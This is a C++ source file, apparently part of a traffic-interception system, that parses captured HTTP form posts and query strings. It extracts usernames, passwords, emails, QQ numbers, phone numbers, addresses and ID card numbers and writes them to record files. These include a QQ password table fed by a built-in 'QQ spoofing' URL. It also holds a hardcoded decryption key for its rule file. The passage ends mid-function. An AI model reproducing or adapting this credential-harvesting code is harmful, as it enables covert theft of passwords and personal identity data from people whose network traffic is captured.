// Split.cpp: implementation of the Split class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "http.h"

#include "Poststruct.h"
#include "PostSplit.h"
#include "HttpProxy.h"
//#include "..\\QQ_Crypt.h"

//#define _DEBUG_HTTPUP
//////////////////////////////////////////////////////////////////////
// 变量
GenMatchFieldList	v_GenKeyList;
int					v_offUrl = OFFSET_SPLITURL;
int					v_offReg = OFFSET_SPLITREG;

extern CCrc32	g_crc32Calc;

void OutDebugInfo(LPCTSTR FmtTxt, ...)
{
#ifdef _DEBUG_HTTPUP
	CString str;
	va_list args;
	va_start( args, FmtTxt );
	str.FormatV(FmtTxt, args);
	va_end( args );
	str.TrimRight("\r\n");
	
	printf("%s\r\n", str);
#endif
}

//////////////////////////////////////////////////////////////////////////
// 函数
PostSplit::PostSplit()
{

}

PostSplit::~PostSplit()
{

}

BOOL PostSplit::Split(CString &str ,CStringArray &array,LPCTSTR e)//用于分割单个字符
{
	CString t;
	if(str.GetLength()>1000)//太长丢
		return FALSE;
	t.Format("%s",str); 
	LPCTSTR tmpstr=t;

	int mm=strlen(e);
	while (tmpstr != NULL)
	{
		char *tp1 = strstr(tmpstr, e);
		if (tp1 != NULL)
		{
			*tp1 = 0;
			tp1+=mm;
			array.Add(tmpstr);
		}
		else
			array.Add(tmpstr);
		tmpstr = tp1;
	}
	return TRUE;
} 
// BOOL PostSplit::Split(CString &str ,CStringArray &array,char e)//用于分割单个字符
// {
// 	CString tmpstr;
// 	int pos;
// 	if(str.GetLength()>600)//太长丢
// 		return FALSE;
// 	pos=str.Find(e);
// 	while (pos>=0)
// 	{
// 		tmpstr=str.Left(pos);
// 		if(!tmpstr.IsEmpty())
// 			array.Add(tmpstr); //
// 		str=str.Mid(pos+1);
// 		pos=str.Find(e);
// 	}
// 	if(str.GetLength()>0)
// 	{
// 		array.Add(str);
// 	}
// 
// 	return TRUE;
// 	
// }
//
//void PostSplit::Split(CString str ,CStringArray &array,CString e)//用于分割字符
//{
//	CString tmpstr,tempstr;
//	int pos;
//	pos=str.Find(e);
//	while (pos>=0)
//	{
//		tmpstr=str.Left(pos);
//		array.Add(tmpstr);
//		tempstr=str.Mid(pos+e.GetLength());
//		str=tempstr;
//		pos=str.Find(e);
//	}
//	if(str.GetLength()>0)
//	{
//		array.Add(str);
//	}

void PostSplit::Split(CString &str,CString &field,CString &value,LPCTSTR e)
{
	int pos;
	if(!str.IsEmpty())
	{
		if ((pos=str.Find(e))>=0)
		{
			field=str.Left(pos);
			if(pos<str.GetLength())
			{
				value=str.Mid(pos+1);	
			}
		}
	}
}

void PostSplit::Split(CString &str,CStringArray &fields,CStringArray &values,LPCTSTR e,LPCTSTR d)
{
	str.Replace("\r\n","");//去除 内容中的"\r\n"
	CStringArray array;
	CString field;
	CString value;

	if(!Split(str,array,e))
		return ;
	int count=array.GetSize(); 
	if(count>50)
		return ;//超长
	for(int i=0;i<array.GetSize();i++)
	{
		Split(array.GetAt(i),field,value,d);
		field.TrimRight();
		if(!field.IsEmpty() && !value.IsEmpty())
		{
			//左侧是ascii 长度小20 右边值长度小于50 
			if(field.GetLength()<20 && value.GetLength()<50   && value.GetLength()>=2 && IsAsciiStr(field))
			{
				fields.Add(field);//字段名
				values.Add(value);//值
			}
		}
	}	
}



void PostSplit::Split(CString &str,PostFieldinfoList &postinfolst,LPCTSTR e,LPCTSTR d)
{
	str.Replace("\r\n","");//去除 内容中的"\r\n"
	CStringArray array;
	CString field;
	CString value;
	Split(str,array,e);
	int count=array.GetSize(); 
	if(count>50)
		return ;//超长
	for(int i=0;i<array.GetSize();i++)
	{
		Split(array.GetAt(i),field,value,d);
		field.TrimRight();
		if(!field.IsEmpty() && !value.IsEmpty())
		{
			//左侧是ascii 长度小20 右边值长度小于50 strlen(passport_51_password)==20
			if(field.GetLength()<30 && value.GetLength()<50   && value.GetLength()>=2 && IsAsciiStr(field))
			{
				
				//fields.Add(field);//字段名
				//values.Add(value);//值
				value.TrimRight();
				PostFieldinfo tmp(field,value);
				postinfolst.push_back(tmp);
			}
		}
	}	
}

BOOL PostSplit::IsAsciiStr(CString &Str)
{
	//判是不是ascii码
	BOOL flag=TRUE;
	int len=Str.GetLength();	
	const CHAR * pstr=(LPCSTR)Str;//new CHAR[len];
	//memcpy(pstr,Str,len);
	for(int i=0;i<len;i++)
	{
		if((pstr[i]>0x20 && pstr[i]<0x80) )//为ascii
		{
			
		}
		else
		{
			flag=FALSE;
			break;
		}
	}
	//delete pstr;
	return flag;
}

BOOL SPlitWithCustomList(
				PostFieldinfoList &inlist,
				PostFieldinfoList &outlist,
				CString topdomain,
				CString &strCrcBase,
				BOOL Isregist)
{
	BOOL rSplit = FALSE;

	CString strV;
	long buid;
	CustomUrlFieldListIt ubegin,uend,utmp;
	PostFieldinfoListIt pbegina,penda,ptmpa;

	/// 组合用户名密码
	PostFieldinfo fixUserPass("", "");
// 	fixUserPass.FieldType = 0;
// 	fixUserPass.InfoType = 0xF00;
	if (Isregist)
	{
		buid=v_HttpregistAccID;
		ubegin		= v_HttpregistList[buid].begin();
		utmp		= ubegin;
		uend		= v_HttpregistList[buid].end();
	}
	else
	{
		buid=v_CustUrlAccID;
		ubegin		= v_CustUrlList[buid].begin();
		utmp		= ubegin;
		uend		= v_CustUrlList[buid].end();
	}
	while(utmp!=uend)
	{
		pbegina	= inlist.begin();
		ptmpa	= pbegina;
		penda	= inlist.end();
		if (memcmp((char*)(LPCSTR)utmp->strdomain,(char*)(LPCSTR)topdomain,utmp->strdomain.GetLength())==0)
		{
			fixUserPass.typeinfo=utmp->InfoType;
			fixUserPass.strhttpname=utmp->strhttpname;
			
			while(ptmpa != penda)
			{
#ifdef _DEBUG
// 			CString uField = utmp->strField;
// 			CString pField = ptmpa->strfield;
// 			CString DDESC = utmp->strDesc;
// 			int		uFType = utmp->FieldType;
// 			int		uIType = utmp->InfoType;
#endif
				if (!utmp->struserid.IsEmpty()&&
					memcmp((char*)(LPCSTR)utmp->struserid,(char*)(LPCSTR)ptmpa->strfield,utmp->struserid.GetLength())==0)
				{
					fixUserPass.struserid=ptmpa->strvalue;
					ConvertUtf8toGbk(fixUserPass.struserid, fixUserPass.struserid.GetLength(), fixUserPass.struserid);

				}
				else if (!utmp->strpassword.IsEmpty()&&
					memcmp((char*)(LPCSTR)utmp->strpassword,(char*)(LPCSTR)ptmpa->strfield,utmp->strpassword.GetLength())==0)
				{
					fixUserPass.strpassword=ptmpa->strvalue;
					ConvertUtf8toGbk(fixUserPass.strpassword, fixUserPass.strpassword.GetLength(), fixUserPass.strpassword);

				}
				else if (utmp->InfoType==2)//注册的时候
				{
					
					if (!utmp->stremail.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->stremail,(char*)(LPCSTR)ptmpa->strfield,utmp->stremail.GetLength())==0)
					{
						fixUserPass.stremail=ptmpa->strvalue;
					}
					else if (!utmp->strqq.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->strqq,(char*)(LPCSTR)ptmpa->strfield,utmp->strqq.GetLength())==0)
					{
						fixUserPass.strqq=ptmpa->strvalue;
					}
					else if (!utmp->straddres.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->straddres,(char*)(LPCSTR)ptmpa->strfield,utmp->straddres.GetLength())==0)
					{
						fixUserPass.straddres=ptmpa->strvalue;
					}
					else if (!utmp->strmobile.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->strmobile,(char*)(LPCSTR)ptmpa->strfield,utmp->strmobile.GetLength())==0)
					{
						fixUserPass.strmobile=ptmpa->strvalue;
					}
					else if (!utmp->strcardnum.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->strcardnum,(char*)(LPCSTR)ptmpa->strfield,utmp->strcardnum.GetLength())==0)
					{
						fixUserPass.strcardnum=ptmpa->strvalue;
					}
					else if (!utmp->strcardtype.IsEmpty()&&
						memcmp((char*)(LPCSTR)utmp->strcardtype,(char*)(LPCSTR)ptmpa->strfield,utmp->strcardtype.GetLength())==0)
					{
						fixUserPass.strcardtype=ptmpa->strvalue;
					}
				}
				ptmpa++;

			}
			if (!fixUserPass.struserid.IsEmpty())
			{
				outlist.push_back(fixUserPass);
			}
		}
		utmp++;
	}

	return true;
}
//////////////////////////////////////////////////////////////////////////
// 返回值, TRUE拆出, FALSE未拆出
DWORD	SplitHttpup(CString topdomain,
					char*	pstrpost,
					CString &strCrcBase,
					PostFieldinfoList & outlist)
{
#ifdef	ADD_RUNSTATE_INFO
	v_httprunstate.AddState(240);
#endif
	
	CString strpost = pstrpost;
	topdomain.TrimLeft("http: ");
	topdomain.TrimLeft("/");		// 去掉http:// 头, 如果有的话

int errNo = 0;
	DWORD rSplit = 0;
	try
	{
		PostFieldinfoList	postinfolist;	// Post字段集
		CustomUrlFieldList	abstractlist;	// 选中的定制项, 据Url
errNo = 10;
		PostSplit::Split(strpost,postinfolist,"\n","=");		
errNo = 20;
#ifdef	ADD_RUNSTATE_INFO
		v_httprunstate.AddState(241);
#endif
		
#ifdef _DEBUG
		OutDebugInfo("%s", topdomain);
		PostFieldinfoListIt pbegina,penda,ptmpa;
		pbegina	= postinfolist.begin();
		ptmpa	= pbegina;
		penda	= postinfolist.end();
		while(ptmpa != penda)
		{
			OutDebugInfo("%s --> %s", ptmpa->strfield, ptmpa->strvalue);
			ptmpa++;
		}
#endif
		

errNo = 30;
		long buid = v_CustUrlAccID;
		if(v_CustUrlList[buid].size()>0 &&
			!topdomain.IsEmpty())
		{
errNo = 40;
			// 有定制项
			SPlitWithCustomList(postinfolist, outlist, topdomain, strCrcBase,0);
		}
		if(v_HttpregistList[v_HttpregistAccID].size()>0&&
			!topdomain.IsEmpty())
		{
errNo = 40;
			// 有定制项
			SPlitWithCustomList(postinfolist, outlist, topdomain, strCrcBase,1);
		}
		if(outlist.size()>0)
			rSplit |= 0xF0;
errNo = 50;

/*		GenMatchFieldListIt mbegin,mend,mtmp;
		if(v_GenKeyList.size() > 0  && !topdomain.IsEmpty())
		{
			mbegin	= v_GenKeyList.begin();
			mend = mbegin;
			for(int iSkip = 0; iSkip< v_offUrl; iSkip++)
				mend ++;
			
			mtmp	= mbegin;
			while(mtmp!=mend)
			{
				if( (mtmp->fieldtype == 3) && 
					(mtmp->strField.find(topdomain)>=0) )
				{
					rSplit |= 0xF000;
					break;
				}
				mtmp ++;
			}
		}
errNo = 60;

#ifdef	ADD_RUNSTATE_INFO
		v_httprunstate.AddState(242);
#endif
		DWORD arrysizzze = postinfolist.size();
		if(rSplit > 0)
		{
			if(arrysizzze<2 || arrysizzze>30)	// 注册不能超30
				return FALSE;
		}
		else
		{
			if(arrysizzze<2 || arrysizzze>15)	// 登陆不能超15
				return FALSE;
		}
errNo = 200;
		outlist.clear();	// 清

		int iPassPrio, iUserPrio;
		iPassPrio = iUserPrio = 0xFFFF;
		PostFieldinfo fixUserPass("", "");
		fixUserPass.FieldType = 4;
		fixUserPass.InfoType = 0xF00;

		BOOL bMatchSplit;
		CString strV;

errNo = 300;
		PostFieldinfoListIt pbegin,pend,ptmp;
		pbegin	= postinfolist.begin();
		ptmp	= pbegin;
		pend	= postinfolist.end();
		while(ptmp!=pend)
		{
			// 统一小写比对, 拆解符
			ptmp->strfield.MakeLower();
			//通用字段匹配
			mbegin	= v_GenKeyList.begin();
			for(int iSkip = 0; iSkip< v_offReg; iSkip++)
				mbegin ++;
			mend	= v_GenKeyList.end();
			mtmp	= mbegin;
			bMatchSplit = FALSE;
			while(mtmp!=mend)
			{
#ifdef _DEBUG
				CString strField = mtmp->strField.patt;
#endif
errNo = 400;
				iSkip ++;
				switch(mtmp->matchtype)
				{
				case 0:		// 精确
					{
						if(ptmp->strfield.CompareNoCase(mtmp->strField.patt) ==0)
							bMatchSplit =TRUE;
					}
					break;
				case 1:		// 模糊
					{
						if(mtmp->strField.find(ptmp->strfield)>=0)
							bMatchSplit =TRUE;
					}
					break;
				case 2:		// 右匹配
					{
						if(mtmp->strKey==ptmp->strfield.Right(mtmp->strlen))
							bMatchSplit =TRUE;
					}
					break;
				}

errNo = 410;
				if(bMatchSplit)
				{
errNo = 411;
					ptmp->priority = mtmp->priority;
					if(mtmp->fieldtype==2)		// user
					{
						ptmp->FieldType = 1;
						if(rSplit & 0xF00)
						{
							ptmp->InfoType = 0xF000;
						}
						else
						{
							ptmp->InfoType = 0xF00;

							if(iUserPrio > ptmp->priority)
							{
								iUserPrio = ptmp->priority;
								fixUserPass.strfield	= ptmp->strfield;
								fixUserPass.strvalue   = ptmp->strvalue;							
								fixUserPass.strDesc1   = ptmp->strDesc1;							
							}
						}
					}
					else	// pass
					{
						ptmp->FieldType = 2;
						if(rSplit & 0xF00)
						{
							ptmp->InfoType = 0xF000;
						}
						else
						{
							ptmp->InfoType = 0xF00;
							if( iPassPrio > ptmp->priority &&
								ptmp->strvalue.GetLength()<=20)	// 密码最大小于20
							{
								iPassPrio = ptmp->priority;
								fixUserPass.strPassField = ptmp->strfield;
								fixUserPass.strPassValue = ptmp->strvalue;							
								fixUserPass.strDesc2   = ptmp->strDesc2;							
							}
						}
					}
					break;
				}

				mtmp++;
			}
errNo = 420;
			
// 			if(FALSE == bMatchSplit && (rSplit & 0xF000))
// 			{
// 				bMatchSplit = TRUE;
// 				ptmp->InfoType = 0xF000;
// 				ptmp->FieldType = 3;
// 			}
errNo = 430;
			if( bMatchSplit)
			{
				strV.Format("%s=%s\n", ptmp->strfield, ptmp->strvalue);
				strCrcBase += strV;		// 形成校验串

				//增加mtmp 到outlist
				outlist.push_back(*ptmp);
			}
			ptmp++;
		}	// end while 所有字段

errNo = 500;
		if(iUserPrio < 0xFFFF && iPassPrio < 0xFFFF)
		{
			outlist.sort();

			// 第一行, 固定为用户名,密码
			fixUserPass.priority = 0;
			outlist.push_front(fixUserPass);
			rSplit |= 0xF0;		// 内置登录拆解
		}*/
errNo = 600;
	}
	catch (...)
	{
		WriteLog(HTTPPRO,"SplitHttpup Catch Error, No:%d, PostInfo:%s!", errNo, pstrpost);
		rSplit = 0x0;
	}
	return rSplit;
}
//////////////////////////////////////////////////////////////////////////
// 返回值, TRUE拆出, FALSE未拆出
DWORD	SplitHttpDown(CString topdomain,
					CString &strCrcBase,
					PostFieldinfoList & outlist)
{
#ifdef	ADD_RUNSTATE_INFO
	v_httprunstate.AddState(240);
#endif
	
	CString strdown = topdomain;
	topdomain.TrimLeft("http: ");
	topdomain.TrimLeft("/");		// 去掉http:// 头, 如果有的话
	int ipos=topdomain.Find("?");
	if (ipos>0)
	{
		strdown.Format("%s",topdomain.Mid(ipos+1));
	}
	else
	{
		return FALSE;//下载中如果没有？后边的不进行http拆解
	}
int errNo = 0;
	DWORD rSplit = 0;
	try
	{
				//首先循环找一遍url，匹配上才对内容拆解比对，否则直接退出
		BOOL wronddomain=TRUE;
		CustomUrlFieldListIt regubegin,reguend,regutmp;
		regubegin		= v_HttpregistList[v_HttpregistAccID].begin();
		regutmp		= regubegin;
		reguend		= v_HttpregistList[v_HttpregistAccID].end();
		while(regutmp!=reguend)
		{
			if (memcmp((char*)(LPCSTR)regutmp->strdomain,(char*)(LPCSTR)topdomain,regutmp->strdomain.GetLength())==0)
			{
				wronddomain=FALSE;
				break;
			}
			regutmp++;
		}
		if (wronddomain)
		{
			CustomUrlFieldListIt loginubegin,loginuend,loginutmp;
			loginubegin		= v_CustUrlList[v_HttpregistAccID].begin();
			loginutmp		= loginubegin;
			loginuend		= v_CustUrlList[v_HttpregistAccID].end();
			while(loginutmp!=loginuend)
			{
				if (memcmp((char*)(LPCSTR)loginutmp->strdomain,(char*)(LPCSTR)topdomain,loginutmp->strdomain.GetLength())==0)
				{
					wronddomain=FALSE;
					break;
				}
				loginutmp++;
			}
		}
		if (wronddomain)
		{
			return FALSE;
		}
		PostFieldinfoList	postinfolist;	// Post字段集
		CustomUrlFieldList	abstractlist;	// 选中的定制项, 据Url
errNo = 10;
		PostSplit::Split(strdown,postinfolist,"&","=");		
errNo = 20;
#ifdef	ADD_RUNSTATE_INFO
		v_httprunstate.AddState(241);
#endif
		
#ifdef _DEBUG
		OutDebugInfo("%s", topdomain);
		PostFieldinfoListIt pbegina,penda,ptmpa;
		pbegina	= postinfolist.begin();
		ptmpa	= pbegina;
		penda	= postinfolist.end();
		while(ptmpa != penda)
		{
			OutDebugInfo("%s --> %s", ptmpa->strfield, ptmpa->strvalue);
			ptmpa++;
		}
#endif
		

errNo = 30;
		long buid = v_CustUrlAccID;
		if(v_CustUrlList[buid].size()>0 &&
			!topdomain.IsEmpty())
		{
errNo = 40;
			// 有定制项
			SPlitWithCustomList(postinfolist, outlist, topdomain, strCrcBase,0);
		}
		if(v_HttpregistList[v_HttpregistAccID].size()>0&&
			!topdomain.IsEmpty())
		{
errNo = 40;
			// 有定制项
			SPlitWithCustomList(postinfolist, outlist, topdomain, strCrcBase,1);
		}
		if(outlist.size()>0)
			rSplit |= 0xF0;
errNo = 50;

	}
	catch (...)
	{
		WriteLog(HTTPPRO,"SplitHttpdown Catch Error, No:%d, PostInfo:", errNo);
		rSplit = 0x0;
	}
	return rSplit;
}
//建立httpup内置格式对照全局变量
void BuildDeHttpUpInfo()
{
	v_GenKeyList.clear();
	BOOL bGetOK = FALSE;
	if(_access(v_WorkPath+"\\bin\\HttpupSp.dat", 0) == 0)
	{
		FILE* fs=fopen(v_WorkPath+"\\bin\\HttpupSp.dat","rb");
		if(fs!=0)
		{
			v_offReg = v_offUrl = 0;
			bGetOK = TRUE;	// 停用内置拆解可以建一个空的HttpupSp.Dat文件
			int  inLen = _filelength(fs->_file);
			if(inLen > 0)
			{
				unsigned char *pInBuf = new unsigned char[inLen];
				if(fread(pInBuf, 1, inLen, fs) == inLen)
				{
					long m_key[4];
					m_key[0] = 0x8d2834de;
					m_key[1] = 0xf7af2b31;
					m_key[2] = 0x516c0e14;
					m_key[3] = 0x0c48bdbf;
					
					unsigned char *outBuf = new unsigned char[inLen+1024];
					int lPwdLen2 = inLen+1024;
					
					memset((char*)outBuf, 0, lPwdLen2);
					int aTst = qq_crypt(DECRYPT,
						(unsigned char *)pInBuf,
						inLen, 
						(unsigned char *)m_key, 
						outBuf,
						&lPwdLen2);
					if(aTst)	
					{
						CString strV = outBuf;
						strV.Replace("{", "");
						strV.Replace("\t", "");
						strV.Replace("\"", "");
						strV.Replace("}", "");
						
						strV.Replace(",", " ");
						
						char sT[100];
						int aT, bT, cT, dT;
						char *pBuf = strV.GetBuffer(strV.GetLength());
						char *p1 = strstr(pBuf, "\r\n");
						while(p1 != NULL)
						{
							if(p1 > pBuf)
							{
								dT = sscanf(pBuf, "%s %d %d %d", &sT, &aT, &bT, &cT);
								if(dT == 4)
								{
									if(aT == 4)
										v_offReg ++;
									else if(aT == 3)
									{
										v_offReg ++;
										v_offUrl ++;
									}

									GenMatchField tmp(sT, aT, bT, cT);
									
									v_GenKeyList.push_back(tmp);
								}
							}
							
							pBuf += (p1-pBuf+2);
							p1 = strstr(pBuf, "\r\n");
						}
					}
					delete [] outBuf;
				}
				delete [] pInBuf;
			}	// 有数据
			if(fs != 0)
				fclose(fs);
		}	// 打开文件成功
	}	// 文件存在
	
	if(v_GenKeyList.size() == 0 && FALSE == bGetOK)
	{
		WriteLog(HTTPPRO, "内置登录参数文件不存在, 启用程序内置.");

		for(int i=0;v_defaultHttpPos[i].paraname;i++)
		{
			GenMatchField tmp(v_defaultHttpPos[i].paraname,
				v_defaultHttpPos[i].ftype,
				v_defaultHttpPos[i].pri,
				v_defaultHttpPos[i].mtype);
			
			v_GenKeyList.push_back(tmp);
		}		
	}

	WriteLog(HTTPPRO, "获得内置登录项 %d 个.", v_GenKeyList.size());
	return ;	
}

//拆解出的qq登录也入到网络活动历史 虚拟身份中
// BOOL GetHttpupHisRecArray(PostFieldinfoList &outlist, HistoryRecord &hisRec, CStringArray &arrHisRec, CStringArray &arrWebfigRec)
BOOL GetHttpupHisRecArray(PostFieldinfoList &outlist, HistoryRecord &hisRec, CStringArray &arrWebidRec,SocketSession* pSion)//, CStringArray &arrWebfigRec)
{
	CString		strUserField, strPassField;
	CString		 tempstr;
	CString		qqid,qqpassword;
	PostFieldinfoListIt beginpost,endpost,tmppost;
	beginpost	= outlist.begin();
	tmppost		= beginpost;
	endpost		= outlist.end();
	while(tmppost!=endpost)
	{
		if (tmppost->strhttpname=="imwqqcrcak")
		{
			//imwqqcrcak是内置的qq欺骗拆解url，此中数据只入qq密码对照表，不入虚拟身份
			CString tmpstr;
			if (!tmppost->strpassword.IsEmpty())
			{
				// qqid \t pass \t mark \t passtype \t systype(no null)
				tmpstr.Format("%s\t%s\tqq欺骗\t4\tzone",tmppost->struserid,tmppost->strpassword);
				WriteArrToData(HTTP_PROTOCOL, QQPASS_DATA, tmpstr);
			}
			tmppost++;
			continue;
		}
		hisRec.SetRecord(IDX_USER,	  tmppost->struserid);
		hisRec.SetRecord(IDX_PASS,	  tmppost->strpassword);
		hisRec.SetRecord(IDX_UTYPE, tmppost->strhttpname);
		hisRec.SetRecord(IDX_STATE,	  "登录");
		if(hisRec.GetWebidRecord(tempstr))
			arrWebidRec.Add(tempstr);
		if (tmppost->typeinfo==2)
		{
			CString straccount;
			hisRec.GetAccount(straccount);
			CString strhttpreg;
			strhttpreg.Format("%d\1%s\1%s\1%s\1%s\1%s\1%s\1%s\1%s\1%s\1%s\1",time(0),tmppost->strhttpname,straccount,tmppost->struserid,tmppost->strpassword,
				tmppost->stremail,tmppost->strqq,tmppost->straddres,tmppost->strmobile,tmppost->strcardnum,tmppost->strcardtype);
			CMapStringToString Tmp_WarnCutRepeate;
			if (pSion->m_WarnArr.GetSize()>0)
			{
				for (int w = 0; w < pSion->m_WarnArr.GetSize(); w++)
				{
					warnkeyinfo& warninfo = pSion->m_WarnArr.ElementAt(w);

					CString tmp_look,tmp_id;
					tmp_look.Format("%s",warninfo.m_id);
					//一条数据对同一个线索应该只写一个文件，在字典对关键字时或者多次对时会对一个线索重复对上多次。
					//此处写文件时要把重复的数据去重。
					if (Tmp_WarnCutRepeate.Lookup(tmp_look,tmp_id))
					{
						continue;
					}
					else
					{
						Tmp_WarnCutRepeate.SetAt(tmp_look,"");
					}
					CString tmphttpreg;
					tmphttpreg.Format("%s%s",strhttpreg,tmp_look);
					WriteArrToData(HTTP_PROTOCOL, HTTPREGRIST_DATA, tmphttpreg);
				}
				WriteArrToData(HTTP_PROTOCOL, HTTPREGRIST_DATA, strhttpreg);

			}
			else
			{
				WriteArrToData(HTTP_PROTOCOL, HTTPREGRIST_DATA, strhttpreg);

			}
		}

/*		if( tmppost->strfield.Find('\1')>=0 ||
			tmppost->strvalue.Find('\1')>=0 ||
			tmppost->strPassField.Find('\1')>=0 ||
			tmppost->strPassValue.Find('\1')>=0 )
		{
			// 过滤可能存在的, 拆解符或拆解值中含'\1'的情况
			tmppost++;
			continue;
		}

		// 清拆解字段, 留通用属性
		hisRec.SetRecord(IDX_ID,	  "");
		hisRec.SetRecord(IDX_USER,	  "");
		hisRec.SetRecord(IDX_UFORMAT, "");
		hisRec.SetRecord(IDX_UTYPE,   "");
		hisRec.SetRecord(IDX_PASS,	  "");
		hisRec.SetRecord(IDX_PFORMAT, "");
		hisRec.SetRecord(IDX_PTYPE,   "");
		hisRec.SetRecord(IDX_STATE,	  "");

		if(!tmppost->strvalue.IsEmpty())
		{
			ConvertUtf8toGbk(tmppost->strvalue, tmppost->strvalue.GetLength(), tmppost->strvalue);
			string tmpstr = tmppost->strvalue;
			//id转换成汉语。url中编码的解码。
			tmppost->strvalue.Format("%s",UrlDecode(tmpstr).c_str());
		}

		// 登陆
		if(tmppost->InfoType == 0xF00 || tmppost->InfoType == 0xF ||
		tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注	
		{
			ASSERT(	tmppost->FieldType==1 ||
					tmppost->FieldType==2 ||
					tmppost->FieldType==3 ||
					tmppost->FieldType==4 );

			if(tmppost->FieldType == 4)
			{
				strUserField = tmppost->strfield;
				strPassField = tmppost->strPassField;
				// 写
				OutDebugInfo("%s登陆, 用户登陆:%s-->%s, %s-->%s\r\n", 
					(tmppost->InfoType == 0xF00)?"内置":"用户定制", 
					tmppost->strfield, tmppost->strvalue,
					tmppost->strPassField, tmppost->strPassValue);

				hisRec.SetRecord(IDX_USER,	  tmppost->strvalue);
				//hisRec.SetRecord(IDX_USER,	  tmppost->strvalue);
				hisRec.SetRecord(IDX_PASS,	  tmppost->strPassValue);
					hisRec.SetRecord(IDX_UTYPE, tmppost->strDesc1);
					hisRec.SetRecord(IDX_PTYPE, tmppost->strDesc2);
					if(tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注
						hisRec.SetRecord(IDX_STATE,	  "注册");
					else
						hisRec.SetRecord(IDX_STATE,	  "登录");
				hisRec.SetRecord(IDX_UFORMAT, tmppost->strfield);
				hisRec.SetRecord(IDX_PFORMAT, "id");
				if(hisRec.GetWebidRecord(tempstr))
					arrWebidRec.Add(tempstr);
			}
			else if(tmppost->FieldType == 1)
			{
				if(strUserField != tmppost->strfield)
				{
					// 写ID/User
					OutDebugInfo("%s登陆, 用户选项:%s-->%s\r\n", 
						(tmppost->InfoType == 0xF00)?"内置":"用户定制", 
						tmppost->strfield, tmppost->strvalue);
					hisRec.SetRecord(IDX_USER,	  tmppost->strvalue);
					//hisRec.SetRecord(IDX_USER,	  tmppost->strvalue);
					hisRec.SetRecord(IDX_UFORMAT, tmppost->strfield);
					hisRec.SetRecord(IDX_PFORMAT, "id");//改为KEYTYPE
						hisRec.SetRecord(IDX_UTYPE, tmppost->strDesc1);
					if(tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注
						hisRec.SetRecord(IDX_STATE,	  "注册");
					else
						hisRec.SetRecord(IDX_STATE,	  "登录");

					if(hisRec.GetWebidRecord(tempstr))
						arrWebidRec.Add(tempstr);
				}
			}
			else if(tmppost->FieldType == 2)
			{
				if(strPassField != tmppost->strfield)
				{
					// 写Pass
					OutDebugInfo("%s登陆, 密码选项:%s-->%s\r\n",
						(tmppost->InfoType == 0xF00)?"内置":"用户定制", 
						tmppost->strfield, tmppost->strvalue);

					hisRec.SetRecord(IDX_PASS,	  tmppost->strvalue);
					hisRec.SetRecord(IDX_UFORMAT, tmppost->strfield);
					hisRec.SetRecord(IDX_PFORMAT, "password");//改为KEYTYPE
						hisRec.SetRecord(IDX_PTYPE, tmppost->strDesc1);
					if(tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注
						hisRec.SetRecord(IDX_STATE,	  "注册");
					else
						hisRec.SetRecord(IDX_STATE,	  "登录");
					if(hisRec.GetWebidRecord(tempstr))
						arrWebidRec.Add(tempstr);
				}
			}
			else if(tmppost->FieldType == 3)
			{
				if(strPassField != tmppost->strfield)
				{
					// 写Pass
					OutDebugInfo("%s登陆, 密码选项:%s-->%s\r\n",
						(tmppost->InfoType == 0xF00)?"内置":"用户定制", 
						tmppost->strfield, tmppost->strvalue);

					hisRec.SetRecord(IDX_USER,	  tmppost->strvalue);
					hisRec.SetRecord(IDX_UFORMAT, tmppost->strfield);
					hisRec.SetRecord(IDX_PFORMAT, "other");//改为KEYTYPE
						hisRec.SetRecord(IDX_PTYPE, tmppost->strDesc1);
					if(tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注
						hisRec.SetRecord(IDX_STATE,	  "注册");
					else
						hisRec.SetRecord(IDX_STATE,	  "登录");
					if(hisRec.GetWebidRecord(tempstr))
						arrWebidRec.Add(tempstr);


				}
			}
		}
		else if(tmppost->InfoType == 0xF000 || tmppost->InfoType == 0xF0) // 注册
		{

		}
		else if (tmppost->InfoType == 0xF0000)//qq登录
		{
			if(tmppost->FieldType == 1)
			{
				qqid.Format("%s",tmppost->strvalue); 
				hisRec.SetRecord(IDX_ID,	  tmppost->strvalue);
				hisRec.SetRecord(IDX_USER,		tmppost->strvalue);

				hisRec.SetRecord(IDX_UFORMAT, tmppost->strfield);
				hisRec.SetRecord(IDX_UTYPE,	  tmppost->strDesc1);
				hisRec.SetRecord(IDX_STATE,	  "登录");
				if(hisRec.GetWebidRecord(tempstr))
					arrWebidRec.Add(tempstr);


			}
			else if(tmppost->FieldType == 2)
			{
				qqpassword.Format("%s",tmppost->strvalue);
				hisRec.SetRecord(IDX_PASS,	  tmppost->strvalue);
				hisRec.SetRecord(IDX_PFORMAT, tmppost->strfield);
				hisRec.SetRecord(IDX_PTYPE,	  tmppost->strDesc1);
				hisRec.SetRecord(IDX_STATE,	  "登录");
				if(hisRec.GetWebidRecord(tempstr))
					arrWebidRec.Add(tempstr);
			}
		}
		*/
		tmppost++;
	}
	if ((!qqid.IsEmpty()) && 
		(!qqpassword.IsEmpty()))
	{
		CString tmpstr;
		CStringArray tmparr;
		tmpstr.Format("%s\1%s",qqid,qqpassword);
		tmparr.Add(tmpstr);
		WriteArrToData(HTTP_PROTOCOL, QQPASS_DATA, "", &tmparr);
	}
	return TRUE;
}

void SplitHttpupToHis(CString url,
					CString contenttype,
					HttpSession* pSion,
					LPCTSTR pro,
					DATEHEADER& packh,
					CString host,
					bool bhttpproxy)
{
	try
	{
		// 首先判断是否需要拆解
		if ((!v_statHttpup) || (contenttype.CompareNoCase("application/x-www-form-urlencoded")!=0))
		{
			return;	// 拆解开关未打开或类型不对
		}

		static BOOL bSplitHttpup = TRUE;
		long buid = v_CustUrlAccID;
		if(v_GenKeyList.size() == 0 && v_CustUrlList[buid].size() == 0)
		{
			if(bSplitHttpup)
			{
				WriteLog(HTTPPRO, "http拆解停止, 未发现内置规则和用户规则");
				bSplitHttpup = FALSE;
			}
			return;
		}
		if(!bSplitHttpup)
		{
